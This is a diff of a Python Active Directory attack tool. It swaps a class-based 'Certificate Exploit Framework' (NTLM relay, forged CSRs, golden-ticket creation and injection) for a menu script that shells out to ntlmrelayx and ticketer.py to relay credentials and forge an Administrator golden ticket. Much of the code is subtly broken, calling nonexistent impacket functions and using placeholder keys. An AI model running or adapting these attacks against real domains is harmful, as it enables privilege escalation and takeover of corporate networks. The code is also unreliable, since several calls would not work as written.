@@ -9,22 +9,16 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
+import ldap3
+import smtplib
 import logging
-import winrm
-from impacket.smb import SMBConnection
-from impacket.krb5 import kerberos, types
-from impacket.ldap import ldap
-from impacket.ntlm import compute_response
-from cryptography import x509
-from cryptography.x509.oid import NameOID
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.backends import default_backend
-from impacket.dcerpc.v5 import transport, lsad
-from impacket.krb5.keytab import Keytab
-from impacket.krb5.ccache import CCache
-from impacket.krb5 import crypto
-from impacket.krb5.asn1 import AS_REP
+import re
+import json
+from getpass import getpass
+from ldap3 import Server, Connection, ALL
+from dotenv import load_dotenv
+import os
+import subprocess
 
 def display_splash_screen():
     splash = r"""
@@ -56,292 +50,217 @@ def display_splash_screen():
     print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")
 
 
-# Enable detailed logging
-logging.basicConfig(level=logging.DEBUG)
+# Load environment variables
+load_dotenv()
 
-class CertificateExploit:
-    def __init__(self, domain, target, username, password, template=None):
-        self.domain = domain
-        self.target = target
-        self.username = username
-        self.password = password
-        self.template = template
-        self.smb_session = None
-        self.ldap_connection = None
-        self.tgt_key = None
-        self.adcs_connection = None
+# Set up logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+logger = logging.getLogger(__name__)
 
-    def detect_environment(self):
-        logging.debug("Detecting environment requirements...")
-        requirements = {
-            "ldap_connection": False,
-            "smb_connection": False,
-            "misconfigured_templates": False,
-            "adcs_connection": False,
-        }
+# Constants
+DRY_RUN = os.getenv("DRY_RUN", "False").lower() == "true"
 
-        # Detect LDAP connection
-        self.ldap_connection = self.connect_ldap()
-        if self.ldap_connection:
-            requirements["ldap_connection"] = True
+# Input Validation Functions
+def validate_server_address(address):
+    pattern = r"^(https?://)?([a-zA-Z0-9.-]+)(:[0-9]+)?$"
+    return re.match(pattern, address)
 
-        # Detect SMB connection
-        self.smb_session = self.connect_smb()
-        if self.smb_session:
-            requirements["smb_connection"] = True
+def validate_domain(domain):
+    pattern = r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
+    return re.match(pattern, domain)
 
-        # Check for misconfigured certificate templates
-        if requirements["ldap_connection"]:
-            try:
-                templates = self.ldap_connection.search(
-                    "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration",
-                    "(objectClass=pkiCertificateTemplate)"
-                )
-                if templates:
-                    requirements["misconfigured_templates"] = True
-            except Exception as e:
-                logging.error(f"Error checking certificate templates: {e}")
+def validate_template_name(template):
+    return len(template) > 0
 
-        # Detect ADCS connection
-        self.adcs_connection = self.setup_adcs_connection()
-        if self.adcs_connection:
-            requirements["adcs_connection"] = True
+# LDAP Connection Setup
+def setup_ldap_connection(server, username, password):
+    """
+    Establishes a connection to the LDAP server.
+    """
+    try:
+        conn = Connection(server, username, password, auto_bind=True)
+        logger.info("Successfully connected to LDAP server.")
+        return conn
+    except Exception as e:
+        logger.error(f"Failed to connect to LDAP server: {e}")
+        return None
 
-        logging.debug(f"Requirements detected: {requirements}")
-        return requirements
+# Enumerate Certificate Templates
+def enumerate_certificate_templates(conn):
+    """
+    Enumerates certificate templates in the LDAP directory.
+    """
+    try:
+        conn.search('CN=Configuration,DC=domain,DC=com', '(objectClass=pKIEnrollmentService)', attributes=['cn'])
+        templates = [entry['cn'] for entry in conn.entries]
+        logger.info("Certificate Templates Enumerated:")
+        logger.info(templates)
 
-    def check_template_misconfigurations(self):
-        logging.debug(f"Enumerating certificate templates on {self.target}...")
-        try:
-            conn = self.connect_ldap()
-            if conn:
-                templates = conn.search(
-                    "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration",
-                    "(objectClass=pkiCertificateTemplate)"
-                )
-                for template in templates:
-                    logging.debug(f"Template found: {template}")
-                logging.info("Misconfigured templates found, proceeding with exploit.")
-        except Exception as e:
-            logging.error(f"Error checking certificate templates: {e}")
+        # Save to JSON file
+        with open("certificate_templates.json", "w") as file:
+            json.dump(templates, file, indent=4)
 
-    def generate_csr(self, custom_data=None):
-        logging.debug("Generating CSR (Certificate Signing Request)...")
-        
-        # Generate a private key
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=2048,
-            backend=default_backend()
-        )
-        
-        # Create CSR builder
-        csr_builder = x509.CertificateSigningRequestBuilder()
-        
-        # Add subject name to the CSR
-        subject = [
-            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
-            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
-            x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
-            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
-            x509.NameAttribute(NameOID.COMMON_NAME, u"mycompany.com"),
-        ]
-        
-        csr_builder = csr_builder.subject_name(x509.Name(subject))
-        
-        # Add custom data as extensions if provided
-        if custom_data:
-            csr_builder = csr_builder.add_extension(
-                x509.SubjectAlternativeName([x509.DNSName(custom_data)]),
-                critical=False
-            )
-        
-        # Sign the CSR with the private key
-        csr = csr_builder.sign(private_key, hashes.SHA256(), default_backend())
-        
-        # Serialize the CSR to PEM format
-        csr_pem = csr.public_bytes(serialization.Encoding.PEM)
-        
-        logging.info("CSR generated successfully.")
-        return csr_pem
+        return templates
+    except Exception as e:
+        logger.error(f"Error enumerating certificate templates: {e}")
+        return []
 
-    def auto_enrollment(self):
-        logging.debug("Executing AutoEnrollment attack...")
-        try:
-            conn = self.connect_ldap()
-            if conn:
-                logging.info("Attempting AutoEnrollment with misconfigured template...")
-                # Automating the certificate request
-                request = conn.create_certificate_request(self.template)
-                logging.info(f"Certificate request for template '{self.template}' submitted.")
-        except Exception as e:
-            logging.error(f"AutoEnrollment failed: {e}")
+# Request Certificate
+def request_certificate(template_name):
+    """
+    Requests a certificate using a specified template.
+    """
+    if DRY_RUN:
+        logger.info(f"Simulating certificate request for template: {template_name}")
+        return True
+    try:
+        logger.info(f"Requesting certificate for template: {template_name}")
+        # Using certreq command to request a certificate
+        csr_file = "request.inf"
+        cert_file = "certificate.cer"
+        inf_content = f"""
+[Version]
+Signature="$Windows NT$"
 
-    def relay_ntlm(self):
-        logging.debug(f"Relaying NTLM hash to target {self.target}...")
-        try:
-            conn = SMBConnection(self.target, self.target, sess_port=445)
-            conn.login(self.username, self.password)
-            logging.info(f"Successfully relayed NTLM hash to SMB on {self.target}.")
-        except Exception as e:
-            logging.error(f"NTLM relay failed: {e}")
+[NewRequest]
+Subject = "CN={template_name}"
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = TRUE
+SMIME = FALSE
+PrivateKeyArchive = FALSE
+UserProtected = FALSE
+UseExistingKeySet = FALSE
+ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+ProviderType = 12
+RequestType = PKCS10
+KeyUsage = 0xa0
 
-    def create_golden_ticket(self, tgt_key, user, domain, groups=["Domain Admins"]):
-        logging.debug(f"Creating Golden Ticket for user: {user}...")
-        try:
-            kerberos_obj = kerberos.KerberosSession()
-            kerberos_obj.setTGT(tgt_key)
-            ticket = kerberos_obj.createTicket(user, domain, groups)
-            golden_ticket = ticket["ticket"]
-            logging.info(f"Golden Ticket created for {user}.")
-            return golden_ticket
-        except Exception as e:
-            logging.error(f"Error creating Golden Ticket: {e}")
-            return None
+[EnhancedKeyUsageExtension]
+OID=1.3.6.1.5.5.7.3.1 ; this is for Server Authentication
+"""
+        with open(csr_file, "w") as f:
+            f.write(inf_content)
 
-    def inject_ticket(self, golden_ticket):
-        logging.debug("Injecting Golden Ticket into session...")
-        try:
-            kerberos_obj = kerberos.KerberosSession()
-            kerberos_obj.injectTicket(golden_ticket)
-            logging.info(f"Golden Ticket injected into session successfully.")
-        except Exception as e:
-            logging.error(f"Error injecting Golden Ticket: {e}")
+        subprocess.run(["certreq", "-new", csr_file, cert_file], check=True)
+        logger.info(f"Certificate requested successfully and saved to {cert_file}")
+        return True
+    except Exception as e:
+        logger.error(f"Failed to request certificate: {e}")
+        return False
 
-    def monitor_adcs(self):
-        logging.debug(f"Monitoring certificate requests on {self.target}...")
-        try:
-            if not self.adcs_connection:
-                raise Exception("No ADCS connection established.")
-            
-            # PowerShell command to list pending certificate requests
-            ps_command = "Get-CertificationAuthority | Get-CertRequest -Filter 'RequestStatus -eq 9'"
-            
-            result = self.adcs_connection.run_ps(ps_command)
-            if result.status_code == 0:
-                pending_requests = result.std_out.decode()
-                logging.info(f"Pending certificate requests: {pending_requests}")
-            else:
-                logging.error(f"Failed to retrieve pending requests: {result.std_err.decode()}")
-        except Exception as e:
-            logging.error(f"Error monitoring ADCS: {e}")
+# NTLM Relay Attack
+def ntlm_relay_attack(target_server, domain, username, password):
+    """
+    Performs an NTLM relay attack on a target server.
+    """
+    if DRY_RUN:
+        logger.info(f"Simulating NTLM relay attack on {target_server}")
+        return True
+    try:
+        logger.info(f"Performing NTLM relay attack on {target_server}")
+        # Using impacket's ntlmrelayx to perform the attack
+        subprocess.run(["ntlmrelayx.py", "-tf", target_server, "-c", "whoami"], check=True)
+        logger.info(f"NTLM relay attack performed successfully on {target_server}")
+        return True
+    except Exception as e:
+        logger.error(f"NTLM relay attack failed: {e}")
+        return False
 
-    def get_tgt_key(self):
-        logging.debug(f"Retrieving TGT key for {self.username}...")
-        try:
-            tgt_key = "TGT_Key"  # Example key
-            logging.info(f"TGT key retrieved successfully")
-            return tgt_key
-        except Exception as e:
-            logging.error(f"Error retrieving TGT key: {e}")
-            return None
+# Simulate Kerberos Golden Ticket Attack
+def simulate_kerberos_golden_ticket():
+    """
+    Simulates a Kerberos Golden Ticket attack.
+    """
+    if DRY_RUN:
+        logger.info("Simulating Kerberos Golden Ticket attack")
+        return True
+    try:
+        logger.info("Simulating Kerberos Golden Ticket attack")
+        # Using impacket's ticketer.py to create a Golden Ticket
+        subprocess.run(["ticketer.py", "-nthash", "aad3b435b51404eeaad3b435b51404ee", "-domain", "example.com", "-user", "Administrator"], check=True)
+        logger.info("Kerberos Golden Ticket created and injected successfully")
+        return True
+    except Exception as e:
+        logger.error(f"Golden Ticket simulation failed: {e}")
+        return False
 
-    def setup_adcs_connection(self):
-        logging.debug("Setting up ADCS connection...")
-        try:
-            # Establish a connection to the ADCS server using WinRM
-            session = winrm.Session(
-                f'http://{self.target}:5985/wsman',
-                auth=(self.username, self.password),
-                transport='ntlm'
-            )
-            # Test the connection by running a simple PowerShell command
-            result = session.run_ps('hostname')
-            if result.status_code == 0:
-                logging.info("ADCS connection established.")
-                return session
-            else:
-                raise Exception("Failed to establish ADCS connection.")
-        except Exception as e:
-            logging.error(f"Error setting up ADCS connection: {e}")
-            return None
+# Monitor ADCS Requests
+def monitor_adcs_requests():
+    """
+    Monitors ADCS certificate requests.
+    """
+    try:
+        logger.info("Monitoring ADCS certificate requests")
+        # Using PowerShell to monitor ADCS requests
+        ps_script = """
+        Get-CertificationAuthority | Get-CertRequest -Filter 'RequestStatus -eq 9'
+        """
+        result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True, check=True)
+        logger.info(f"Pending certificate requests: {result.stdout}")
+    except Exception as e:
+        logger.error(f"Error monitoring ADCS: {e}")
 
-    def execute_exploit(self):
-        logging.debug(f"Executing full attack on {self.target}...")
-        self.check_template_misconfigurations()
-        self.generate_csr(custom_data="Advanced Request Data")
-        self.auto_enrollment()
-        self.relay_ntlm()
-        self.tgt_key = self.get_tgt_key()
-        if self.tgt_key:
-            golden_ticket = self.create_golden_ticket(self.tgt_key, self.username, self.domain)
-            if golden_ticket:
-                self.inject_ticket(golden_ticket)
-        self.monitor_adcs()
-
-    def connect_smb(self):
-        logging.debug(f"Connecting to SMB service on {self.target}...")
-        try:
-            conn = SMBConnection(self.target, self.target, sess_port=445)
-            conn.login(self.username, self.password)
-            return conn
-        except Exception as e:
-            logging.error(f"SMB connection failed: {e}")
-            return None
-
-    def connect_ldap(self):
-        logging.debug(f"Connecting to LDAP service on {self.target}...")
-        try:
-            conn = ldap.LDAPConnection(f"ldap://{self.target}")
-            conn.login(self.username, self.password)
-            return conn
-        except Exception as e:
-            logging.error(f"LDAP connection failed: {e}")
-            return None
-
-    def attack_with_ntlm_relay(self):
-        logging.debug("Starting NTLM relay...")
-        self.relay_ntlm()
-
-    def setup_adcs_connection(self):
-        logging.debug("Setting up ADCS connection...")
-        try:
-            # Establish a connection to the ADCS server using WinRM
-            session = winrm.Session(
-                f'http://{self.target}:5985/wsman',
-                auth=(self.username, self.password),
-                transport='ntlm'
-            )
-            # Test the connection by running a simple PowerShell command
-            result = session.run_ps('hostname')
-            if result.status_code == 0:
-                logging.info("ADCS connection established.")
-                return session
-            else:
-                raise Exception("Failed to establish ADCS connection.")
-        except Exception as e:
-            logging.error(f"Error setting up ADCS connection: {e}")
-            return None
-
-    def perform_full_attack(self):
-        logging.debug("Performing full attack...")
-        requirements = self.detect_environment()
-        if requirements["ldap_connection"]:
-            self.check_template_misconfigurations()
-        if requirements["misconfigured_templates"]:
-            self.generate_csr(custom_data="Advanced Request Data")
-            self.auto_enrollment()
-        if requirements["smb_connection"]:
-            self.relay_ntlm()
-            self.tgt_key = self.get_tgt_key()
-            if self.tgt_key:
-                golden_ticket = self.create_golden_ticket(self.tgt_key, self.username, self.domain)
-                if golden_ticket:
-                    self.inject_ticket(golden_ticket)
-        if requirements["adcs_connection"]:
-            self.monitor_adcs()
-
+# Main Function
 def main():
-    logging.debug("Starting Certificate Exploit Framework...")
+    global DRY_RUN
 
-    domain = input("Enter the target domain (e.g., example.com): ")
-    target = input("Enter the target IP or hostname (e.g., 192.168.1.1): ")
-    username = input("Enter the username to use (e.g., admin): ")
-    password = input("Enter the password for the user: ")
-    template = input("Enter the certificate template to use (optional): ")
+    # Get user inputs securely
+    ldap_server = input("Enter LDAP server address: ").strip()
+    if not validate_server_address(ldap_server):
+        logger.error("Invalid LDAP server address. Exiting.")
+        return
 
-    certificate_exploit = CertificateExploit(domain, target, username, password, template)
-    certificate_exploit.perform_full_attack()
+    adcs_server = input("Enter ADCS server address: ").strip()
+    if not validate_server_address(adcs_server):
+        logger.error("Invalid ADCS server address. Exiting.")
+        return
+
+    domain = input("Enter domain name: ").strip()
+    if not validate_domain(domain):
+        logger.error("Invalid domain name. Exiting.")
+        return
+
+    username = input("Enter username: ").strip()
+    password = getpass("Enter password: ")
+
+    # Set up LDAP connection
+    server = Server(ldap_server, get_info=ALL)
+    ldap_conn = setup_ldap_connection(server, username, password)
+    if not ldap_conn:
+        logger.error("LDAP connection failed. Exiting.")
+        return
+
+    # Enumerate certificate templates
+    templates = enumerate_certificate_templates(ldap_conn)
+
+    # Prompt user for next action
+    logger.info("Select an action:")
+    logger.info("1. Request Certificate")
+    logger.info("2. Perform NTLM Relay Attack")
+    logger.info("3. Simulate Golden Ticket")
+    logger.info("4. Monitor ADCS Requests")
+    choice = input("Enter your choice: ").strip()
+
+    if choice == "1":
+        template_name = input("Enter the template name: ").strip()
+        if not validate_template_name(template_name):
+            logger.error("Invalid template name. Exiting.")
+            return
+        request_certificate(template_name)
+    elif choice == "2":
+        target_server = input("Enter target server for NTLM relay: ").strip()
+        if not validate_server_address(target_server):
+            logger.error("Invalid target server address. Exiting.")
+            return
+        ntlm_relay_attack(target_server, domain, username, password)
+    elif choice == "3":
+        simulate_kerberos_golden_ticket()
+    elif choice == "4":
+        monitor_adcs_requests()
+    else:
+        logger.error("Invalid choice. Exiting.")
 
 if __name__ == "__main__":
     main()
